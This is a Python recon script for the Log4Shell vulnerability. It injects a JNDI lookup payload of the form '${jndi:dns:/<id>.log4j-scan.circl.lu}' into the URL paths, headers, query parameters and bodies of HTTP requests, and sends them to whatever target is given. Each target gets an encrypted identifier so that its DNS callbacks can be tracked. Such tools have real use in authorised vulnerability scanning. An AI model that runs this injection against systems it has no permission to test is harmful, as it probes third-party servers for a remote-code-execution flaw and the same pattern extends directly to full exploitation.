#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import argparse
import json
import logging
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

"""
    Recon script that sends HTTP requests to the target host by injecting a jndi:dns payload in multiple places.
"""


def encrypt(key, data):
    f = Fernet(key)
    return f.encrypt(bytes(data, "utf-8"))


def decrypt(key, data):
    f = Fernet(key)
    return f.decrypt(bytes(data, "utf-8"))


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--target', help='target host/ip, example: google.com', type=str, required=True)
    parser.add_argument('--psk', help='pre-shared key', type=str, required=True)
    parser.add_argument('--tracker', type=str, dest='tracker', help='dns resolve tracker', default='log4j-scan.circl.lu')
    parser.add_argument('--max-label-len', type=int, dest='max_label_len', default=64)
    parser.add_argument('-v', type=int, dest='verbosity', help='sets the logging verbosity, info=20, debug=10', default=20)
    args = parser.parse_args()

    # set verbosity
    logging.basicConfig(format='%(levelname)s: %(message)s', level=args.verbosity)

    # create target identifier, add dots so that the target identifier is a valid dns label
    key = bytes(args.psk, "utf-8")
    id = re.sub("(.{%s})" % args.max_label_len, "\\1.", encrypt(key, args.target).decode("utf-8"), 0, re.DOTALL)

    # payload: ${jndi:dns:/<id>.log4j-scan.circl.lu}
    payload_format = '${jndi:dns:/%s.%s}'

    logging.info(f"Identifier for host {args.target} = {id}")

    # load templates
    with open('templates.json', 'r') as f:
        templates = json.load(f)

    # send requests
    for template in templates:
        logging.info(f"Testing template id={template['id']}")

        # use dns resolve payload as it's less intrusive
        payload = payload_format % (str(id), args.tracker)
        logging.info(f"Payload: {payload}")

        # build protocol
        protocol = 'http'
        if 'protocol' in template:
            protocol = template['protocol']

        # build base url
        base_url = '%s://%s' % (protocol, args.target)
        if 'port' in template:
            base_url += ':%s' % template['port']

        # build path
        url = base_url
        if 'path' in template:
            url = base_url + template['path'].format(payload=payload)

        # build headers
        headers = {}
        if 'headers' in template:
            for header in template['headers']:
                headers[header['name']] = header['format'].format(payload=payload)

        # build query
        params = {}
        if 'query_params' in template:
            for query in template['query_params']:
                params[query['name']] = query['format'].format(payload=payload)

        # build body
        body = None
        if 'body' in template:
            body = template['body'].format(payload=payload)

        response = requests.request(
            template['method'],
            url=url,
            params=params,
            headers=headers,
            data=body
        )
